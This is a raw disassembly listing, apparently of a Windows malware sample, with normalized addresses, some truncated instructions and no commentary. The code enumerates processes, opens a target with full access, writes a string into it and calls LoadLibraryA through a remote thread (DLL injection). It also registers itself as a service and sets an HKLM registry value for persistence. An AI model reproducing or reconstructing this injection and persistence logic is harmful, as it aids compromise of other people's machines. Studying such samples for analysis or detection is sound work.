sub_401000
push ebx
push ebp
push esi
push edi
xor edi edi
call sub_401090
mov esi [ esp + 0x14 ]
mov ebp [ strncmp@IAT ]
push 0x3
push rw-data
push esi
lea ebx [ esi + 0x3 ]
call ebp
add esp 0xc
test eax eax
jne r-xdata
push 0x3
push rw-data
push esi
call ebp
add esp 0xc
test eax eax
jne r-xdata
push ebx
call [ atoi@IAT ]
add esp 0x4
test eax eax
jne r-xdata
push rw-data
call sub_401110
add esp 0x4
mov esi [ Sleep@IAT ]
mov ecx [ esp + 0x18 ]
push ecx
push eax
call sub_401240
pop edi
pop esi
pop ebp
pop ebx
retn
push ebx
call sub_401110
add esp 0x4
inc edi
test eax eax
jne r-xdata
push 0x1d4c0
call esi
jmp r-xdata
cmp edi 0x3
jge r-xdata
sub_401090
sub esp 0x1c
lea eax [ esp ]
push eax
push 0x28
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
add esp 0x1c
retn
lea ecx [ esp + 0x4 ]
push ecx
push rw-data
push 0x0
call [ LookupPrivilegeValueA@IAT ]
test eax eax
je r-xdata
mov edx [ esp + 0x4 ]
mov eax [ esp + 0x8 ]
push 0x0
push 0x0
lea ecx [ esp + 0x14 ]
mov [ esp + 0x18 ] edx
mov edx [ esp + 0x8 ]
push 0x10
push ecx
push 0x0
push edx
mov [ esp + 0x24 ] 0x1
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] 0x2
call [ AdjustTokenPrivileges@IAT ]
test eax eax
je r-xdata
mov eax [ esp ]
push eax
call [ CloseHandle@IAT ]
sub_401110
mov eax 0x110c
call sub_401960
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
push ebx
mov [ esp + 0xc ] eax
mov ax [ rw-data ]
mov [ esp + 0x10 ] ecx
mov cl [ rw-data ]
push ebp
push esi
push edi
mov [ esp + 0x24 ] ax
mov [ esp + 0x26 ] cl
mov ecx 0x3d
xor eax eax
lea edi [ esp + 0x27 ]
mov [ esp + 0x20 ] edx
lea edx [ esp + 0x14 ]
[ edi ]
stosb [ edi ]
push edx
lea eax [ esp + 0x120 ]
push 0x1000
push eax
call EnumProcesses
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x110c
retn
mov ebp [ esp + 0x14 ]
xor ebx ebx
shr ebp 0x2
test ebp ebp
jle r-xdata
mov esi [ esp + 0x10 ]
push esi
call [ CloseHandle@IAT ]
lea edi [ esp + 0x11c ]
inc ebx
add edi 0x4
cmp ebx ebp
jl r-xdata
lea edx [ esp + 0x14 ]
lea eax [ esp + 0x10 ]
push edx
push 0x4
push eax
push esi
call EnumProcessModules
test eax eax
je r-xdata
mov ecx [ edi ]
push ecx
push 0x0
push 0x410
call [ OpenProcess@IAT ]
mov esi eax
test esi esi
je r-xdata
push esi
call [ CloseHandle@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x110c
retn
mov edx [ esp + 0x10 ]
lea ecx [ esp + 0x18 ]
push 0x104
push ecx
push edx
push esi
call GetModuleBaseNameA
mov eax [ esp + 0x1120 ]
lea ecx [ esp + 0x18 ]
push eax
push ecx
call [ _stricmp@IAT ]
add esp 0x8
test eax eax
je r-xdata
push esi
call [ CloseHandle@IAT ]
mov eax [ esp + ebx * 4 + 0x11c ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x110c
retn
sub_401240
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x24
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor esi esi
mov [ ebp - 0x24 ] esi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x4 ] esi
push esi
mov edi [ ebp + 0xc ]
push edi
call [ _lopen@IAT ]
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
call sub_40135d
mov ebx [ ebp - 0x20 ]
mov esi [ ebp - 0x28 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
push ebx
push 0x1f0fff
call [ OpenProcess@IAT ]
mov ebx eax
mov [ ebp - 0x20 ] ebx
test ebx ebx
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push 0x8000
push 0x0
push esi
push ebx
call [ VirtualFreeEx@IAT ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov edi ecx
inc edi
mov [ ebp - 0x34 ] edi
push 0x4
push 0x1000
push edi
push eax
push ebx
call [ VirtualAllocEx@IAT ]
mov esi eax
mov [ ebp - 0x28 ] esi
test esi esi
je r-xdata
test ebx ebx
je r-xdata
push eax
call [ CloseHandle@IAT ]
push 0x0
push edi
mov ecx [ ebp + 0xc ]
push ecx
push esi
push ebx
call [ WriteProcessMemory@IAT ]
test eax eax
je r-xdata
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x24 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
push ebx
call [ CloseHandle@IAT ]
push rw-data
push rw-data
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov edi eax
mov [ ebp - 0x2c ] edi
test edi edi
je r-xdata
push rw-data
call [ LoadLibraryA@IAT ]
mov [ ebp - 0x30 ] eax
push rw-data
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
push 0x0
push 0x0
push esi
push edi
push 0x0
push 0x0
push ebx
call eax
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
push 0xffffffff
mov edx eax
push edx
call [ WaitForSingleObject@IAT ]
mov [ ebp - 0x24 ] 0x1
sub_40135d
test esi esi
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push 0x8000
push 0x0
push esi
push ebx
call [ VirtualFreeEx@IAT ]
test ebx ebx
je r-xdata
push eax
call [ CloseHandle@IAT ]
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x24 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
push ebx
call [ CloseHandle@IAT ]
sub_4013b0
mov edx ecx
push ebx
mov ecx 0x1
push esi
mov [ edx ] r--data
mov [ rw-data ] edx
push edi
xor eax eax
mov [ edx + 0x1a4 ] ecx
mov [ edx + 0x1a8 ] ecx
mov edi rw-data
or ecx 0xffffffff
mov [ edx + 0x19c ] eax
mov [ edx + 0x1a0 ] 0x10
mov [ edx + 0x1ac ] eax
mov [ edx + 0x1b0 ] eax
mov [ edx + 0x1b4 ] eax
mov [ edx + 0x1b8 ] eax
mov [ edx + 0x1bc ] eax
lea ebx [ edx + 0x18 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi ebx
lea ebx [ edx + 0x58 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi ebx
lea ebx [ edx + 0x98 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebx
retn
sub_401480
push ebx
push esi
push edi
xor ebx ebx
push 0xf003f
push ebx
mov edi ecx
push ebx
call [ OpenSCManagerA@IAT ]
mov esi eax
test esi esi
je r-xdata
pop edi
mov eax ebx
pop esi
pop ebx
retn
add edi 0x18
push 0x1
push edi
push esi
call [ OpenServiceA@IAT ]
mov edi [ CloseServiceHandle@IAT ]
test eax eax
je r-xdata
push esi
call edi
push eax
mov ebx 0x1
call edi
sub_4014d0
sub esp 0x20c
push ebx
push ebp
push esi
push edi
push 0xf003f
push 0x0
mov ebx ecx
push 0x0
call [ OpenSCManagerA@IAT ]
mov edi eax
test edi edi
jne r-xdata
lea eax [ esp + 0x118 ]
push 0x104
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
push 0x0
push 0x0
push 0x0
push 0x0
lea ecx [ esp + 0x128 ]
push 0x0
push ecx
push 0x1
push 0x2
push 0x20
lea edx [ ebx + 0x58 ]
lea ebp [ ebx + 0x18 ]
push 0xf01ff
push edx
push ebp
push edi
call [ CreateServiceA@IAT ]
mov esi eax
test esi esi
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x20c
retn
push 0x0
push 0x0
push esi
call [ StartServiceA@IAT ]
test eax eax
push esi
mov esi [ CloseServiceHandle@IAT ]
jne r-xdata
push edi
call [ CloseServiceHandle@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x20c
retn
call esi
push edi
call esi
mov ecx 0x8
mov esi rw-data
lea edi [ esp + 0x14 ]
xor eax eax
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov ecx 0x38
lea edi [ esp + 0x37 ]
[ edi ]
stosb [ edi ]
mov edi ebp
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x14 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea eax [ esp + 0x10 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
push 0x20006
lea ecx [ esp + 0x1c ]
push 0x0
push ecx
push 0x80000002
call [ RegOpenKeyExA@IAT ]
lea edx [ ebx + 0x98 ]
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
push ecx
push edx
mov edx [ esp + 0x18 ]
push 0x1
push eax
push rw-data
push edx
call [ RegSetValueExA@IAT ]
mov eax [ esp + 0x10 ]
push eax
call [ RegCloseKey@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x20c
retn
call esi
push edi
call esi
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x20c
retn
sub_401660
push esi
mov esi [ rw-data ]
push sub_4017e0
lea eax [ esi + 0x18 ]
mov [ esi + 0x1a4 ] 0x2
push eax
call [ RegisterServiceCtrlHandlerA@IAT ]
test eax eax
mov [ esi + 0x19c ] eax
je r-xdata
pop esi
retn 0x8
mov ecx esi
call sub_401700
test eax eax
je r-xdata
push 0x1
mov ecx esi
call sub_4016d0
mov edx [ esi ]
mov ecx esi
mov [ esi + 0x1bc ] 0x1
mov [ esi + 0x1ac ] 0x0
mov [ esi + 0x1b4 ] 0x0
mov [ esi + 0x1b8 ] 0x0
call [ edx ]
sub_401700
push esi
push edi
mov esi ecx
push 0x2
call sub_4016d0
mov eax [ esi ]
mov ecx esi
call [ eax + 0x4 ]
mov edi eax
call [ GetLastError@IAT ]
mov [ esi + 0x1ac ] eax
xor eax eax
cmp edi eax
mov [ esi + 0x1b4 ] eax
mov [ esi + 0x1b8 ] eax
jne r-xdata
push 0x4
mov ecx esi
call sub_4016d0
pop edi
mov eax 0x1
pop esi
retn
push 0x1
mov ecx esi
call sub_4016d0
pop edi
xor eax eax
pop esi
retn
sub_401760
sub esp 0x104
lea eax [ esp ]
push ebx
push esi
push edi
push 0x104
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
lea ecx [ esp + 0xc ]
push 0x2e
push ecx
call [ strrchr@IAT ]
mov [ eax ] 0x0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x14 ]
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x14 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
push rw-data
call sub_401000
add esp 0x10
pop edi
pop esi
pop ebx
add esp 0x104
retn
sub_4017e0
mov ecx [ esp + 0x4 ]
push esi
mov esi [ rw-data ]
lea eax [ ecx - 0x1 ]
cmp eax 0x4
ja r-xdata
cmp ecx 0x80
jb r-xdata
jmp [ eax * 4 + jump_table_401858 ]
mov ecx [ esi + 0x19c ]
lea eax [ esi + 0x1a0 ]
push eax
push ecx
call [ SetServiceStatus@IAT ]
pop esi
retn 0x4
mov edx [ esi ]
push ecx
mov ecx esi
call [ edx + 0x1c ]
push 0x3
mov ecx esi
call sub_4016d0
mov eax [ esi ]
mov ecx esi
call [ eax + 0x8 ]
jmp r-xdata
mov edx [ esi ]
mov ecx esi
call [ edx + 0x10 ]
jmp r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x14 ]
jmp r-xdata
mov edx [ esi ]
mov ecx esi
call [ edx + 0xc ]
jmp r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x18 ]
jmp r-xdata
sub_401880
sub esp 0x1c
push esi
push edi
push 0xf003f
push 0x0
mov edi ecx
push 0x0
call [ OpenSCManagerA@IAT ]
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
add esp 0x1c
retn
add edi 0x18
push 0xf01ff
push edi
push esi
call [ OpenServiceA@IAT ]
mov edi eax
test edi edi
je r-xdata
lea eax [ esp + 0x8 ]
push eax
push 0x1
push edi
call [ ControlService@IAT ]
test eax eax
je r-xdata
push edi
mov edi [ CloseServiceHandle@IAT ]
call edi
push esi
call edi
sub_401900
sub esp 0x1c0
lea ecx [ esp ]
call sub_4013b0
lea ecx [ esp ]
call sub_401480
test eax eax
lea ecx [ esp ]
jne r-xdata
call sub_401630
xor eax eax
add esp 0x1c0
retn 0x10
call sub_4014d0
xor eax eax
add esp 0x1c0
retn 0x10
sub_401960
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_401b15
cmp [ rw-data ] ebx
jne r-xdata
call sub_401b00
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_401b12
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_401900
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_401630
sub esp 0x10
xor eax eax
add ecx 0x18
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] eax
lea eax [ esp ]
mov [ esp ] ecx
push eax
mov [ esp + 0x8 ] sub_401660
call [ StartServiceCtrlDispatcherA@IAT ]
add esp 0x10
retn
sub_401870
mov eax 0x1
retn
sub_4018e0
retn
sub_4018f0
xor eax eax
retn 0x4
GetModuleBaseNameA
jmp [ GetModuleBaseNameA@IAT ]
EnumProcessModules
jmp [ EnumProcessModules@IAT ]
EnumProcesses
jmp [ EnumProcesses@IAT ]
_except_handler3
jmp [ _except_handler3@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_401b00
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_401b12
xor eax eax
retn
sub_401b15
retn
_controlfp
jmp [ _controlfp@IAT ]
